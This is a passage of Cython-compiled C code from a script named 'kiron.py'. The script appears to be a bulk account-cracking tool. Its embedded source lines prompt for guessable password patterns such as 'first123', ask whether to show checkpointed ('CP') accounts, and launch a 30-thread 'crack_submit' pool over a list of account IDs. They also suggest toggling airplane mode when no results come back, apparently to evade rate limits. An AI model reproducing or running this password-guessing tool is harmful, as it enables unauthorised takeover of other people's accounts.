          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_5, __pyx_t_6); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 284, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

          /* "kiron.py":283
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 *                                 for i in range(ps_limit):             # <<<<<<<<<<<<<<
 *                                     plist.append(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m\x1b[38;5;46m{A} '))
 *                                 linex()
 */
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":285
 *                                 for i in range(ps_limit):
 *                                     plist.append(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m\x1b[38;5;46m{A} '))
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 285, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 285, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":286
 *                                     plist.append(input(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m\x1b[38;5;46m{A} '))
 *                                 linex()
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 *                                 clear()
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 286, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":287
 *                                 linex()
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()             # <<<<<<<<<<<<<<
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m DO YOU WENT SHOW CP ACCOUNT  \x1b[38;5;244m[\x1b[38;5;46mY\x1b[38;5;244m/\x1b[1;91mN\x1b[38;5;244m]')
 */
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__35, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 287, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_linex); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 287, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 287, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":288
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 *                                 clear()             # <<<<<<<<<<<<<<
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m DO YOU WENT SHOW CP ACCOUNT  \x1b[38;5;244m[\x1b[38;5;46mY\x1b[38;5;244m/\x1b[1;91mN\x1b[38;5;244m]')
 *                                 linex()
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_clear); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 288, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 288, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":289
 *                                 print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m \x1b[38;5;46m57273200 59039200 57575751 ');linex()
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m DO YOU WENT SHOW CP ACCOUNT  \x1b[38;5;244m[\x1b[38;5;46mY\x1b[38;5;244m/\x1b[1;91mN\x1b[38;5;244m]')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 cx=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 */
        __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 289, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 289, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 289, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_DO_YOU_WENT);
        __pyx_t_8 += 108;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_DO_YOU_WENT);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_DO_YOU_WENT);
        __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 289, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 289, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":290
 *                                 clear()
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m DO YOU WENT SHOW CP ACCOUNT  \x1b[38;5;244m[\x1b[38;5;46mY\x1b[38;5;244m/\x1b[1;91mN\x1b[38;5;244m]')
 *                                 linex()             # <<<<<<<<<<<<<<
 *                                 cx=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                                 if cx in ['y','Y','yes','Yes','1']:
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_linex); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 290, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = NULL;
        __pyx_t_7 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_7 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 290, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        /* "kiron.py":291
 *                                 print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m DO YOU WENT SHOW CP ACCOUNT  \x1b[38;5;244m[\x1b[38;5;46mY\x1b[38;5;244m/\x1b[1;91mN\x1b[38;5;244m]')
 *                                 linex()
 *                                 cx=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')             # <<<<<<<<<<<<<<
 *                                 if cx in ['y','Y','yes','Yes','1']:
 *                                         pcp.append('y')
 */
        __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 291, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = 0;
        __pyx_t_9 = 127;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
        __pyx_t_8 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_38_5_244m_2);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_A); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 291, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 291, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_6);
        __pyx_t_6 = 0;
        __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
        __pyx_t_8 += 33;
        __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_38_5_244m_38_5_46m_CHOICE);
        __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 291, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 291, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_v_cx = __pyx_t_4;
        __pyx_t_4 = 0;

        /* "kiron.py":292
 *                                 linex()
 *                                 cx=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                                 if cx in ['y','Y','yes','Yes','1']:             # <<<<<<<<<<<<<<
 *                                         pcp.append('y')
 *                                 else:
 */
        __Pyx_INCREF(__pyx_v_cx);
        __pyx_t_4 = __pyx_v_cx;
        __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_n_s_y, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 292, __pyx_L3_error)
        if (!__pyx_t_10) {
        } else {
          __pyx_t_11 = __pyx_t_10;
          goto __pyx_L32_bool_binop_done;
        }
        __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_n_s_Y, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 292, __pyx_L3_error)
        if (!__pyx_t_10) {
        } else {
          __pyx_t_11 = __pyx_t_10;
          goto __pyx_L32_bool_binop_done;
        }
        __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_n_s_yes, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 292, __pyx_L3_error)
        if (!__pyx_t_10) {
        } else {
          __pyx_t_11 = __pyx_t_10;
          goto __pyx_L32_bool_binop_done;
        }
        __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_n_s_Yes, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 292, __pyx_L3_error)
        if (!__pyx_t_10) {
        } else {
          __pyx_t_11 = __pyx_t_10;
          goto __pyx_L32_bool_binop_done;
        }
        __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_10 < 0))) __PYX_ERR(0, 292, __pyx_L3_error)
        __pyx_t_11 = __pyx_t_10;
        __pyx_L32_bool_binop_done:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_10 = __pyx_t_11;
        if (__pyx_t_10) {

          /* "kiron.py":293
 *                                 cx=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                                 if cx in ['y','Y','yes','Yes','1']:
 *                                         pcp.append('y')             # <<<<<<<<<<<<<<
 *                                 else:
 *                                         pcp.append('n')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_pcp); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_n_s_y); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 293, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          /* "kiron.py":292
 *                                 linex()
 *                                 cx=input(f'\x1b[38;5;244m[{A}?\x1b[38;5;244m]\x1b[38;5;46m CHOICE : ')
 *                                 if cx in ['y','Y','yes','Yes','1']:             # <<<<<<<<<<<<<<
 *                                         pcp.append('y')
 *                                 else:
 */
          goto __pyx_L31;
        }

        /* "kiron.py":295
 *                                         pcp.append('y')
 *                                 else:
 *                                         pcp.append('n')             # <<<<<<<<<<<<<<
 *                                 with tred(max_workers=30) as crack_submit:
 *                                         clear()
 */
        /*else*/ {
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_pcp); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 295, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_n_s_n); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 295, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __pyx_L31:;

        /* "kiron.py":296
 *                                 else:
 *                                         pcp.append('n')
 *                                 with tred(max_workers=30) as crack_submit:             # <<<<<<<<<<<<<<
 *                                         clear()
 *                                         total_ids = str(len(fo))
 */
        /*with:*/ {
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_tred); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 296, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 296, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 296, __pyx_L3_error)
          __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 296, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_12 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 296, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 296, __pyx_L37_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_16 = NULL;
          __pyx_t_7 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
              __pyx_t_7 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_16, NULL};
            __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 296, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          }
          __pyx_t_4 = __pyx_t_6;
          __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          /*try:*/ {
            {
              __Pyx_PyThreadState_declare
              __Pyx_PyThreadState_assign
              __Pyx_ExceptionSave(&__pyx_t_13, &__pyx_t_14, &__pyx_t_21);
              __Pyx_XGOTREF(__pyx_t_13);
              __Pyx_XGOTREF(__pyx_t_14);
              __Pyx_XGOTREF(__pyx_t_21);
              /*try:*/ {
                __pyx_v_crack_submit = __pyx_t_4;
                __pyx_t_4 = 0;

                /* "kiron.py":297
 *                                         pcp.append('n')
 *                                 with tred(max_workers=30) as crack_submit:
 *                                         clear()             # <<<<<<<<<<<<<<
 *                                         total_ids = str(len(fo))
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;244m\x1b[38;5;46m{A} '+total_ids+f' ')
 */
                __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_clear); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 297, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_5);
                __pyx_t_6 = NULL;
                __pyx_t_7 = 0;
                #if CYTHON_UNPACK_METHODS
                if (unlikely(PyMethod_Check(__pyx_t_5))) {
                  __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
                  if (likely(__pyx_t_6)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                    __Pyx_INCREF(__pyx_t_6);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_5, function);
                    __pyx_t_7 = 1;
                  }
                }
                #endif
                {
                  PyObject *__pyx_callargs[2] = {__pyx_t_6, NULL};
                  __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_7, 0+__pyx_t_7);
                  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 297, __pyx_L41_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                }
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

                /* "kiron.py":298
 *                                 with tred(max_workers=30) as crack_submit:
 *                                         clear()
 *                                         total_ids = str(len(fo))             # <<<<<<<<<<<<<<
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;244m\x1b[38;5;46m{A} '+total_ids+f' ')
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASS \x1b[38;5;244m\x1b[38;5;46m{A} {ps_limit} \x1b[38;5;244m[{A}M{mthd}\x1b[38;5;244m]')
 */
                if (unlikely(!__pyx_v_fo)) { __Pyx_RaiseUnboundLocalError("fo"); __PYX_ERR(0, 298, __pyx_L41_error) }
                __pyx_t_8 = PyObject_Length(__pyx_v_fo); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 298, __pyx_L41_error)
                __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 298, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 298, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_v_total_ids = __pyx_t_5;
                __pyx_t_5 = 0;

                /* "kiron.py":299
 *                                         clear()
 *                                         total_ids = str(len(fo))
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;244m\x1b[38;5;46m{A} '+total_ids+f' ')             # <<<<<<<<<<<<<<
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m PASS \x1b[38;5;244m\x1b[38;5;46m{A} {ps_limit} \x1b[38;5;244m[{A}M{mthd}\x1b[38;5;244m]')
 *                                         print(f'\x1b[38;5;244m[{A}*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE')
 */
                __pyx_t_5 = PyTuple_New(5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 299, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_5);
                __pyx_t_8 = 0;
                __pyx_t_9 = 127;
                __Pyx_INCREF(__pyx_kp_u_38_5_244m_2);
                __pyx_t_8 += 12;
                __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_2);
                PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_38_5_244m_2);
                __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_A); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 299, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 299, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_6);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_9;
                __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_6);
                __pyx_t_6 = 0;
                __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_ACCOUN);
                __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
                __pyx_t_8 += 60;
                __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_ACCOUN);
                PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u_38_5_244m_38_5_46m_TOTAL_ACCOUN);
                __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_A); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 299, __pyx_L41_error)
                __Pyx_GOTREF(__pyx_t_6);
